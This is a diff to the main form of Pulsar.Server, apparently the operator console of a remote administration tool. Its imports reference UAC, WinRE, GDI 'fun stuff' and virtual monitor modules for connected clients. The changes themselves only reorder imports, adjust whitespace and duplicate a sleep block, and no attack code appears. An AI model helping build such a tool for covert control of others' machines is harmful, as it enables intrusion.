@@ -1,10 +1,15 @@
+using Newtonsoft.Json;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.Actions;
 using Pulsar.Common.Messages.ClientManagement;
+using Pulsar.Common.Messages.ClientManagement.UAC;
+using Pulsar.Common.Messages.ClientManagement.WinRE;
 using Pulsar.Common.Messages.FunStuff;
 using Pulsar.Common.Messages.FunStuff.GDI;
+using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 using Pulsar.Common.Messages.Preview;
+using Pulsar.Common.Messages.QuickCommands;
 using Pulsar.Common.Messages.UserSupport.MessageBox;
 using Pulsar.Common.Messages.UserSupport.Website;
 using Pulsar.Server.Extensions;
@@ -15,26 +20,23 @@ using Pulsar.Server.Networking;
 using Pulsar.Server.Utilities;
 using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Diagnostics;
+using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
-using Pulsar.Common.Messages.QuickCommands;
-using System.IO;
-using Newtonsoft.Json;
-using System.Drawing;
-using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
-
-using Pulsar.Common.Messages.ClientManagement.UAC;
-using Pulsar.Common.Messages.ClientManagement.WinRE;
 
 namespace Pulsar.Server.Forms
 {
     public partial class FrmMain : Form
     {
+        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
         public PulsarServer ListenServer { get; set; }
+
         private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC
 
         private const int STATUS_ID = 5;
@@ -524,6 +526,7 @@ namespace Pulsar.Server.Forms
         private void UpdateConnectedClientsCount()
         {
             if (_countUpdateRunning) return;
+
             _countUpdateRunning = true;
 
             ThreadPool.QueueUserWorkItem(_ =>
@@ -553,12 +556,13 @@ namespace Pulsar.Server.Forms
         private void ProcessClientConnections(object state)
         {
             const int batchSize = 10; // up to 10 clients at once
-            var batch = new List<KeyValuePair<Client, bool>>(batchSize);
 
+            var batch = new List<KeyValuePair<Client, bool>>(batchSize);
+            
             while (true)
             {
                 batch.Clear();
-
+                
                 lock (_clientConnections)
                 {
                     if (!ListenServer.Listening)
@@ -605,6 +609,11 @@ namespace Pulsar.Server.Forms
                 if (_clientConnections.Count > 0)
                 {
                     Thread.Sleep(10);
+                }
+                
+                if (_clientConnections.Count > 0)
+                {
+                    Thread.Sleep(10); 
                 }
             }
         }
@@ -1076,6 +1085,7 @@ namespace Pulsar.Server.Forms
             lock (_statusUpdateLock)
             {
                 if (!_pendingStatusUpdates.ContainsKey(client))
+
                     _pendingStatusUpdates[client] = new Dictionary<string, object>();
 
                 _pendingStatusUpdates[client][field] = value;
@@ -1090,8 +1100,9 @@ namespace Pulsar.Server.Forms
 
         private void ProcessStatusUpdates()
         {
-            Thread.Sleep(50); //small delay for batched updates.
 
+            Thread.Sleep(50); //small delay for batched updates.
+            
             Dictionary<Client, Dictionary<string, object>> updates;
             lock (_statusUpdateLock)
             {
@@ -1110,6 +1121,7 @@ namespace Pulsar.Server.Forms
                     foreach (var update in updates)
                     {
                         var item = lstClients.Items.Cast<ListViewItem>()
+
                             .FirstOrDefault(lvi => lvi != null && update.Key.Equals(lvi.Tag));
 
                         if (item != null)
